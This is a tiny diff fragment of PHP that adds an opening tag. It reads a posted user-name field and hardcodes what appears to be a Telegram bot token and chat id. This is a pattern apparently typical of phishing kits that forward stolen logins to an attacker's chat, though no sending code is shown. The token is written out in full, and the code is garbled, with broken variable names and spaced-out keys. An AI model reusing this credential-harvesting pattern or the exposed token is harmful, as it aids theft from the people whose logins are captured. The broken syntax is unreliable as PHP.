@@ -1,3 +1,4 @@
+<?php
 $name = $_POST [' user _name '];
 $token = "5674676719:AAEKyLdE2JadnPQH5lyamYgo46OhJWOjR_4";
 $Schat id = "-968208666";
